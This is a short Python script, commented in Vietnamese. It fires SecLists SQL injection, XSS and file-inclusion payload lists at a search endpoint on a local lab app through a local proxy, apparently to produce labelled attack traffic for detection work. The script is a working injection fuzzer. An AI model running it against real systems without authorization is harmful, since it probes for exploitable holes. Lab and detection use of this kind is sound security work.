import requests
import time

# Cấu hình
TARGET_URL = "http://localhost:3000/rest/products/search" 
PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
# Đường dẫn tới file payload trong bộ Seclists
PAYLOAD_FILES = {
    "SQLI": "path/to/Seclists/Fuzzing/SQLi/Generic-SQLi.txt",
    "XSS": "path/to/Seclists/Fuzzing/XSS/XSS-Bypass-Strings.txt",
    "LFI": "path/to/Seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
}

def inject_payloads(attack_type):
    print(f"--- Starting {attack_type} Attack ---")
    try:
        with open(PAYLOAD_FILES[attack_type], "r", encoding="utf-8") as f:
            for line in f:
                payload = line.strip()
                if not payload: continue
                
                # Gửi payload qua query parameter 'q'
                params = {"q": payload}
                try:
                    requests.get(TARGET_URL, params=params, proxies=PROXY, timeout=5)
                    print(f"Sent {attack_type}: {payload[:50]}...")
                except Exception as e:
                    print(f"Error sending payload: {e}")
                
                time.sleep(0.1) # Tránh làm treo proxy
    except FileNotFoundError:
        print(f"Error: Không tìm thấy file tại {PAYLOAD_FILES[attack_type]}")

if __name__ == "__main__":
    # Lưu ý: Nhớ đổi CURRENT_LABEL trong logger.py tương ứng trước khi chạy mỗi loại
    inject_payloads("SQLI")
    # inject_payloads("XSS")